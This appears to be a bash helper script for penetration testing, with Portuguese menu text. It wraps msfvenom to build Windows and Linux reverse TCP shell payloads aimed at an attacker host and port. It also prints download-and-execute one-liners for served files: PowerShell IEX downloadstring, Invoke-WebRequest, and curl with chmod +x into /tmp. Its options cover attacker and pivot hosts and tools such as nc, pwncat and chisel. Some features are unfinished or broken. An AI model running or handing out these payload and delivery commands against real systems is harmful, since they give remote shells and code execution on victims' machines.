#!/bin/bash
########## HELP
# Usage
##### HELP
########## TODO
# -b, bind
# -r, reverse
# -s, staged
# -t, tipo, msvenon, bashsocket
##### TODO

########## FUNCTIONS
# Functions

# if not set, ask for it and set it
var_check() {
	local count=1
	for i in "$@"; do
		var_name=$i
		var_value=${!var_name}
		if [ -z "$var_value" ]; then
			read -p "$count. Type the $var_name: " var_value
			eval "$var_name=$var_value"
			((count++))
		fi
	done
}

# select a network interface, return the ip from that interface
select_interface (){
	# Get the list of interfaces without any extraneous characters
	interfaces=( $(ip -c=never -4 -br a | grep "UP\|UNKNOWN" | awk -F' ' '{print $1}') )
	select iface in "${interfaces[@]}"; do
		# Once selected, get the IPv4 address for that interface
		ipv4=$(ip -j -4 -c=never -p addr show "$iface" | grep -oP '"local": "\K[^"]+' | head -n 1)
		
		# Check if an IP was found
		if [ -z "$ipv4" ]; then
			echo "$iface"
			return 1
		else
			echo "$ipv4"
			return 0
		fi
	done
}

set_colors(){
	cred="\e[31m"
	cgreen="\e[32m"
	cyellow="\e[33m"
	cblue="\e[34m"
	cpurp="\e[35m"
	cwhite="\e[36m"
	creset="\e[0m"
}
set_colors

kill_all (){
    sudo kill -9 $(ps aux | grep -Ei "$1" | grep -Ev "grep|$0" | tr -s ' ' | cut -d ' ' -f 2)
}

centerPrint (){
	local color1=${3:-cblue}
	local color2=${4:-cwhite}
	local text=${1:-"STEP"}
	local char=${2:-"."}
	width=$(tput cols)
	width_sides=$(( ( $width - ${#text} )/2 - 1))
	printf -v side "%*s" "$(( $width_sides/${#char} ))" ""; side=${side// /"$char"};
	printf "%b %b %b\n" "${!color1}$side$def" "${!color2}${text}${creset}" "${!color1}$side$creset"
}

print_status(){
	if [ "$1" -eq 0 ]; then
		echo -e "${cgreen}[  OK  ]${creset} $2"
	else
		echo -e "${cred}[ FAIL ]${creset} $2"
	fi
}

print_links(){
	ip=$1
	port=$2
	dir=$3
	centerPrint "DOWNLOAD LINKS"
	OIFS="$IFS"; IFS=$'\n'; for i in $(ls -t "$dir"); do
		centerPrint "$i" " = "
		echo -e "http://$myip:$port/$i"
		echo -e 'IEX(New-Object net.webclient).downloadstring("http://'$ip:$port/$i'")'
		echo -e 'Invoke-WebRequest -Uri "http://'$ip:$port/$i'" -OutFile "C:\Users\Public\'$i'"'
		# echo -e 'certutil.exe -urlcache -split -f "http://'$ip:$port/$i'" "C:\Users\Public\'$i'"'
		# echo -e 'cd /tmp; wget "http://'$ip:$port/$i'" ; chmod a+x "'$i'"'
		echo -e 'cd /tmp; curl -O "http://'$ip:$port/$i'" ; chmod a+x "'$i'"'
	done; IFS="$OIFS"
}

select_options(){
	local optionse=( "$@" );
	local thisopt=""
    select thisopt in "${optionse[@]}" "Sair"; do echo "$thisopt"; break; done
}

generate_msfvenom () {
	centerPrint "$FUNCNAME" "#"

	echo "Select OS?"; local os=$(select_options "windows" "linux")
	echo "Exploit"; local exploit=$(select_options "shell_reverse_tcp" "shell/reverse_tcp")
	var_check lhost lport extension output_name
	set -x
	msfvenom -p $os/$exploit LHOST=$lhost LPORT=$lport -f $extension > $output_name.$extension
	set +x
}

print_header(){
	help_version="0.2"
	help_dependencies="ssh"
	# colors=( 45 34 94 97 44 ) # azul
	# colors=( 43 31 91 94 42 ) # vermelho
	colors=( 44 32 92 95 43 ) # verde
	# colors=( 45 33 93 96 44 ) # laranja
	# colors=( 46 35 95 98 45 ) # roxo
	# colors=( 48 36 96 99 46 ) # verde oliva
	echo "
	┌─────────────────────┐   [0;${colors[4]}m KK [0;0m[0;${colors[0]}m $(basename $0 .sh | sed "s/^kk//") [0;0m
	│[0;1;${colors[1]};${colors[2]}m╻┏[0m [0;1;${colors[1]};${colors[2]}m╻┏[0m [0;1;${colors[1]};${colors[2]}m╺┳╸┏━┓┏━┓╻[0m  [0;${colors[1]}m┏━┓[0m│   [1;${colors[3]}m Author:  Otávio Augusto[0;0m
	│[0;1;${colors[1]};${colors[2]}m┣┻┓┣┻┓[0m [0;1;${colors[1]};${colors[2]}m┃[0m [0;${colors[1]}m┃[0m [0;${colors[1]}m┃┃[0m [0;${colors[1]}m┃┃[0m  [0;${colors[1]}m┗━┓[0m│   [1;${colors[3]}m Contact: contact@oaugusto.pro[0;0m
	│[0;${colors[1]}m╹[0m [0;${colors[1]}m╹╹[0m [0;${colors[1]}m╹[0m [0;${colors[1]}m╹[0m [0;${colors[1]}m┗━┛┗━┛┗[0;37m━╸┗━┛[0m│   [1;${colors[3]}m Website: http://oaugusto.pro[0;0m
	└─────────────────────┘   [1;${colors[3]}m Social:  @oaugustopro[0;0m

	[0;100m ☕version [0;42m $help_version [0;0m [0;100m ✌license [0;42m MIT [0;0m 
	=================[0;0m [1;${colors[3]}m$(basename $0) execution[0;0m =================[0;0m
	Abre e informa sobre diversos tipos de shell

	Depends on ${help_dependencies}."  | sed -e "s/\t//g"

	echo -e "OPTIONS:" 
	# Show cli options
	cat "$0" | grep -Eo "[A-Za-z]) #.*" | sed "s/\#//g;s/)/,/g;s/^/-/g" | tr '\n' ';'
	echo -e "\nFUNCTIONS:"
	cat "$0" | sed -n '/#STARTOPTIONS1/,/#ENDOPTIONS1/p' | grep -Eo ".*[[:alnum:]]+)$" | tr -d ')\t' | tr -s ' ' | sort -u | cut -d '|' -f 2 | tr '\n' ';'
    echo -e "\n"
}

handle_cli_options (){
	while getopts "u:h:p:H:P:t:a:f:" option; do
		case $option in
			u) # username of the server
			username="$OPTARG"
			;;
			h) # attacker host
			lhost="$OPTARG"
			;;
			p) # attacker port
			lport="$OPTARG"
			;;
			H) # pivot host
			rhost="$OPTARG"
			;;
			P) # pivot port
			rport="$OPTARG"
			;;
			f) # input filename
			filename="$OPTARG"
			;;
			o) # output filename
			output="$OPTARG"
			;;
			a) # application [ssh, nc, pwncat, chiselsrv chiselc, rlwrap, plink]
			application="$OPTARG"
			;;
			*)
				echo "Opção Inválida"
			;;
		esac
	done
}
# Function to handle selection or input
handle_input() {
	#STARTOPTIONS1
    case "$1" in
		*"MSFVenon"|pyhttp)
			generate_msfvenom
		;;
		"Sair")
			exit 0
		;;
		*)
			echo "Invalid option $1"
		;;
	esac
	#ENDOPTIONS1
}
##### END FUNCTIONS
########## MAIN
# Main script
print_header
handle_cli_options "$@"
# Check if input is provided
if [ -n "$function" ]; then
    handle_input "$function"
else
    old_IFS=$IFS; IFS=$'\n'; options=( $(cat "$0" | sed -n '/#STARTOPTIONS1/,/#ENDOPTIONS1/p' | grep -Eo ".*[[:alnum:]]+)$" | tr -d '*)\t' | tr -s ' ' | tr -d \" | cut -d '|' -f1) ); IFS=$old_IFS
    echo -e "${cblue} Select an option:$creset"
    select opt in "${options[@]}" "Sair"; do
        handle_input "$opt"
    done
fi
##### END MAIN
trap "kill -- -$$" EXIT